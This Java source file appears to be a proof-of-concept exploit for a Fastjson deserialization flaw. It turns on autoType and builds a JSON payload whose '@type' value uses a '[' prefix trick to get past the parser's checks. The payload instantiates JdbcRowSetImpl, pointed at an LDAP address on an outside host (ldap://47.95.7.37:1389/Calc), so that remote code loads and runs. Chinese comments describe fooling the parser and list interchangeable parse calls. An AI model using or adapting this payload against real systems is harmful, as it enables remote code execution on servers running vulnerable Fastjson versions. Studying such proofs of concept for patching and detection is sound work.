import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 * Created by xjj on 2023/3/8.
 */
public class FastJson4_Eq1243 {
    static {
        System.setProperty("com.alibaba.fastjson.parser.ParserConfig.autoTypeSupport", "true");
    }
    public static String jdbcRowSetImpl() {
        /**
         * 这个逻辑欺骗了parser, 目的是绕过解析器, 具体怎么找的就是硬整, 一遍遍调试尝试
         */
        String poc = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{, \"dataSourceName\":\"ldap://47.95.7.37:1389/Calc\", \"autoCommit\":true}";

        /**
         * 下面三种任选一种
         * JSON.parse(PoC);
         * JSON.parseObject(PoC);
         * JSONObject.parse(PoC);
         */
        return poc;
    }

    public static void main(String[] args) {
        System.out.println(JSON.VERSION);

        String poc = jdbcRowSetImpl();
        JSON.parseObject(poc);
    }
}
